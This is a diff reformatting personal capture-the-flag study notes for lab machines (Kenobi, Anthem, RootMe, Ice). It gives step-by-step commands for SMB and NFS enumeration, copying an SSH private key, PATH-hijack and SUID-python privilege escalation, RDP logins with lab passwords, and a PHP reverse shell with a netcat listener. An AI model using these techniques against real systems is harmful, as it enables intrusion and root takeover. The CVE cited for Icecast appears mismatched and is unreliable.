@@ -1,80 +1,135 @@
+
 ## **Module-4 Enumeration**
 
 ### **Kenobi**
 
-```nmap -sC -sV IP```
+```
+nmap -sC -sV IP
+```
 
 Let us try anonymous login using smb
 
-```smbclient //10.49.133.202/anonymous```
+```
+smbclient //10.49.133.202/anonymous
+```
 
 We found a file called log.txt here
 
-```get log.txt``` 
+```
+get log.txt
+``` 
 
 It helped us to get it but we found nothing good)
 
-```ncat 10.49.133.202 21```
+```
+ncat 10.49.133.202 21
+```
 
 We found ProFTPD version 1.3.5
 
-```sudo mkdir -p /mnt/kenobiNFS```
+```
+sudo mkdir -p /mnt/kenobiNFS
+```
 
-```showmount -e 10.49.133.202```
+```
+showmount -e 10.49.133.202
+```
 
-```mount | grep kenobi```
+```
+mount | grep kenobi
+```
 
-```ls -la /mnt/kenobiNFS```
+```
+ls -la /mnt/kenobiNFS
+```
 
-```sudo mount -t nfs 10.49.133.202:/var /mnt/kenobiNFS```
+```
+sudo mount -t nfs 10.49.133.202:/var /mnt/kenobiNFS
+```
 
-```cp /mnt/kenobiNFS/tmp/id_rsa .```
+```
+cp /mnt/kenobiNFS/tmp/id_rsa .
+```
 
-```sudo chmod 600 id_rsa```
+```
+sudo chmod 600 id_rsa
+```
 
-```ssh -i id_rsa kenobi@10.49.133.202```
+```
+ssh -i id_rsa kenobi@10.49.133.202
+```
 
 We found first flag after login
 
 ##### **Privilege escalation**
 
-```find / -perm -u=s -type f 2>/dev/null```
+```
+find / -perm -u=s -type f 2>/dev/null
+```
 
 In the list we found /usr/bin/menu a different thing which we can misuse
 
-```/usr/bin/menu```
+```
+/usr/bin/menu
+```
 
-```strings /usr/bin/menu```
+```
+strings /usr/bin/menu
+```
 
-```cd /tmp```
+```
+cd /tmp
+```
 
-```echo /bin/sh > curl```
+```
+echo /bin/sh > curl
+```
 
-```ls```
+```
+ls
+```
 
-```chmod 777 curl```
+```
+chmod 777 curl
+```
 
-```export PATH=/tmp:$PATH```
+```
+export PATH=/tmp:$PATH
+```
 
-```/usr/bin/menu```
+```
+/usr/bin/menu
+```
 
-```1```
+```
+1
+```
 
-```whoami```
+```
+whoami
+```
 
 ##### Now we are root
 
-```cd ..```
+```
+cd ..
+```
 
-```cd root```
+```
+cd root
+```
 
-```cat root.txt```
+```
+cat root.txt
+```
 
-**Module-6 System Hacking**
+## **Module-6 System Hacking**
 
-**Anthem**
+### **Anthem**
 
+```
 nmap -sC -sV -Pn -vv IP
+```
 
 -vv Shows extra details
 
@@ -90,27 +145,31 @@ John doe email was JD@anthem.com so for Solomon Grundy its JD
 
 --------------------------------------------------------------------------------------------------------------------------
 
-1st Flag
+##### 1st Flag
 
 We are hiring
 
-2nd Flag
+##### 2nd Flag
 
 inside- /categories
 
-3th Flag
+##### 3th Flag
 
 We are hiring -> Author John doe
 
-4th Flag
+##### 4th Flag
 
 cheers to IT department - page source
 
 --------------------------------------------------------------------------------------------------------------------------
 
+```
 sudo apt update
+```
 
+```
 sudo apt install freerdp3-x11
+```
 
 xfreerdp is new and rdesktop is old school RDP client
 
@@ -130,7 +189,9 @@ Most modern & actively maintained
 
 7.     Multi-monitor setups
 
+```
 xfreerdp3 /v:<IP> /u:sg /p:UmbracoIsTheBest! /cert:ignore +clipboard /dynamic-resolution
+```
 
 /cert:ignore -> Ignore TLS certificate warnings
 
@@ -140,21 +201,27 @@ xfreerdp3 /v:<IP> /u:sg /p:UmbracoIsTheBest! /cert:ignore +clipboard /dynamic-re
 
 Unhide files in C folder -> edit permissions
 
+ ```
  xfreerdp3 /v:10.64.144.3 /u:Administrator /p:ChangeMeBaby1MoreTime /cert:ignore +clipboard /dynamic-resolution
+ ```
 
-**Module-6 System Hacking**
+## **Module-6 System Hacking**
 
-**RootMe**
+### **RootMe**
 
+```
 nmap -sC -sV --vv <IP>
+```
 
+```
 gobuster dir -u <url> -w <wordlist>
+```
 
 We found  /uploads and /panel
 
 /Panel is hidden directory
 
-**User.txt**
+##### **User.txt**
 
 Let’s search in uploads file on the web
 
@@ -162,7 +229,9 @@ Panel has file upload option so we can use pentest monkey reverse shell
 
 Change ip to yours in php reverse shell of pentest monkey and run netcat on your system
 
+```
 nc -lvnp <port>
+```
 
 Upload php file in it
 
@@ -180,13 +249,17 @@ Click on reverse shell over there
 
 We got user access
 
+```
 find / -name user.txt
+```
 
 We found file inside /var/www/user.txt
 
 **Privilege Escalation**
 
+```
 find / -user root -perm /4000 2>/dev/null
+```
 
 4000 à permission for SUID
 
@@ -204,29 +277,41 @@ Search python and click on suid
 
 [https://gtfobins.github.io/gtfobins/python/#suid](https://gtfobins.github.io/gtfobins/python/#suid)
 
+```
 ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
 
+```
 /usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
 
 /usr/bin is where the python is there
 
 Now we are root and we can cat out root flag
 
-**Module-6 System Hacking**
+## **Module-6 System Hacking**
 
-**Ice**
+### **Ice**
 
+```
 nmap -sV -p8000 10.48.129.48
+```
 
+```
 nmap -sC -sV -Pn -vv 10.48.129.48
+```
 
+```
 nmap -sS <IP>
+```
 
 On port 3389 we found a vulnerable thing
 
 In CVE details we found vulnerability ICE-cast
 
+```
 nmap -T4 -p- --script=vuln -vv 10.48.129.48
+```
 
 search icecast in CVE score (we found vuln cve2014-3704 in port 8000)
 
